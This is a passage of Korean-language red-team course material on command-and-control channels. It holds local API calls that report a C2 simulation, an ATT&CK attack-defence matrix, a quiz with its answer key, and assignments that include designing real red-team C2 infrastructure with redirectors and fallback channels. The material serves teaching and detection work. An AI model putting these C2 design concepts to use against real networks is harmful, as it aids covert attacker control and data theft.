  http://localhost:8000/projects/$PROJECT_ID/evidence/summary | python3 -m json.tool

# PoW 블록 확인
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  "http://localhost:8000/pow/blocks?project_id=$PROJECT_ID" | python3 -m json.tool

# 완료 보고서
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/completion-report \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "summary": "C2 채널 구축 시뮬레이션 완료",
    "outcome": "success",
    "work_details": [
      "DNS 터널링: Base32 인코딩, 다중 비콘, 탐지 지표 분석",
      "HTTP C2: 서버/비콘 코드 생성, Malleable C2 분석",
      "암호화 C2: XOR 인코딩, JA3 핑거프린팅, 엔트로피 분석",
      "방어: Suricata 규칙, 방화벽 아웃바운드, DNS 싱크홀"
    ]
  }' | python3 -m json.tool
```

## 4.4 공격-방어 대응 매트릭스

```
C2 채널 유형       | ATT&CK      | 방어 수단              | 탐지 난이도
==================╪============╪======================╪==========
DNS 터널링        | T1071.004  | 쿼리 길이/빈도 분석     | 중간
HTTP 비콘         | T1071.001  | 프록시 로그, 패턴 분석  | 중간
HTTPS (TLS)       | T1573.002  | SSL 인스펙션, JA3     | 높음
커스텀 암호화      | T1573.001  | 엔트로피 분석          | 높음
Domain Fronting   | T1090.004  | SNI/Host 불일치 탐지  | 매우 높음
Dead Drop         | T1102      | 클라우드 서비스 모니터링 | 매우 높음
```

---

## 검증 체크리스트

- [ ] C2의 역할과 킬체인에서의 위치를 설명할 수 있는가?
- [ ] DNS 터널링의 동작 원리(서브도메인 인코딩, TXT 응답)를 설명할 수 있는가?
- [ ] DNS 터널링의 5가지 이상 탐지 지표를 나열할 수 있는가?
- [ ] HTTP C2 비콘 구조(GET 비콘, POST 결과, sleep, jitter)를 설명할 수 있는가?
- [ ] Malleable C2와 Domain Fronting의 개념을 설명할 수 있는가?
- [ ] JA3 핑거프린팅의 원리와 C2 도구 식별 활용을 이해하는가?
- [ ] Suricata에서 DNS 터널링 탐지 규칙을 작성할 수 있는가?
- [ ] 방화벽 아웃바운드 정책으로 C2를 제한하는 방법을 설명할 수 있는가?
- [ ] XOR 암호화와 TLS 암호화의 차이를 설명할 수 있는가?
- [ ] Dead Drop과 Fallback Channel의 개념을 설명할 수 있는가?

---

## 자가 점검 퀴즈 (10문항)

**Q1.** DNS 터널링에서 Base32를 사용하는 이유는?
- (a) 속도  (b) **DNS 레이블이 영숫자+하이픈만 허용**  (c) 암호화  (d) 압축

**Q2.** C2 비콘의 Jitter 역할은?
- (a) 속도 향상  (b) 암호화  (c) **규칙적 패턴 탐지 방해**  (d) 대역폭 절약

**Q3.** JA3가 분석하는 대상은?
- (a) HTTP 헤더  (b) DNS 쿼리  (c) **TLS ClientHello 파라미터**  (d) IP 주소

**Q4.** DNS 터널링 탐지 지표가 아닌 것은?
- (a) 서브도메인 50자 이상  (b) TXT 비율 급증  (c) **DNS 서버 IP 변경**  (d) 도메인 엔트로피 급증

**Q5.** Malleable C2의 주요 목적은?
- (a) 속도 향상  (b) **C2를 정상 웹 트래픽으로 위장**  (c) 암호화  (d) P2P

**Q6.** Domain Fronting이 CDN을 이용하는 이유는?
- (a) 속도  (b) **SNI와 Host 헤더 불일치 이용**  (c) 비용  (d) 캐싱

**Q7.** Long Polling C2의 특징은?
- (a) 빠른 비콘  (b) **서버가 명령 있을 때까지 연결 유지**  (c) UDP  (d) 파일 전송

**Q8.** 암호화 C2 탐지 방법이 아닌 것은?
- (a) JA3  (b) 엔트로피 분석  (c) 인증서 분석  (d) **페이로드 키워드 매칭**

**Q9.** Dead Drop에 사용 가능한 서비스는?
- (a) 내부 DNS  (b) **GitHub, Twitter, Pastebin**  (c) DHCP  (d) NTP

**Q10.** Fallback Channel(T1008)의 목적은?
- (a) 속도  (b) 암호화  (c) **주 채널 차단 시 대체 경로 확보**  (d) 로그 삭제

**정답:** Q1:b, Q2:c, Q3:c, Q4:c, Q5:b, Q6:b, Q7:b, Q8:d, Q9:b, Q10:c

---

## 과제

### 과제 1: DNS 터널링 탐지 규칙 설계 (필수)
- Suricata 시그니처 규칙 3개를 작성하라 (서브도메인 길이, TXT 비율, 쿼리 빈도)
- 각 규칙의 오탐 가능성을 분석하라
- SolarWinds SUNBURST에서 이 규칙이 동작했을지 논하라

### 과제 2: HTTP C2 비콘 분석 (필수)
- Cobalt Strike와 Sliver의 HTTP 비콘 패턴을 비교하라 (공개 자료 기반)
- 탐지 가능한 특성 3가지를 표로 정리하라
- Malleable C2가 탐지를 우회하는 방법을 설명하라

### 과제 3: C2 인프라 설계 (선택)
- 실전 레드팀용 C2 인프라를 설계하라 (주 채널 + Fallback 포함)
- 리다이렉터, 도메인 전략, 인증서 관리 계획을 포함하라
- 텍스트 기반 인프라 다이어그램을 작성하라

---

## 다음 주 예고

**Week 04: 측면 이동 — Pass-the-Hash, Kerberoasting, Token Impersonation**

C2 채널이 구축된 후 공격자는 내부 네트워크에서 다른 시스템으로 이동한다. 다음 주에는 자격증명 기반 측면 이동 기법을 학습한다.
